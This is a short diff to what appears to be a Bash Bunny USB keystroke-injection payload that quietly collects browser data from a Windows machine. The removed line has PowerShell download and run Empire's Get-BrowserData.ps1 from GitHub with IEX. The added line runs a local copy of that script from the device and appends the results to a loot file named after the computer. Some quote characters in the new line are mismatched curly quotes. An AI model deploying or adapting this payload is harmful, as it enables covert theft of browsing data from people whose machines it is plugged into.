@@ -28,7 +28,7 @@ LED B 200
 Q DELAY 6000
 Q GUI r
 Q DELAY 100
-Q STRING powershell "$bunny =(gwmi win32_volume -f 'label=''BashBunny''' |  Select-Object -ExpandProperty DriveLetter); IEX (New-Object Net.WebClient).downloadstring("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-BrowserData.ps1"); Get-BrowserInformation | Out-File -Append $bunny\loot\BrowserData\$env:computername.txt;"
+RUN WIN powershell \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\Get-BrowserData.ps1'); $bunny =(gwmi win32_volume -f ’label=‘’BashBunny’’' |  Select-Object -ExpandProperty DriveLetter); Get-BrowserInformation | Out-File -Append $bunny\loot\BrowserData\$env:computername.txt\"
 Q ENTER
 Q DELAY 2000
 Q STRING exit
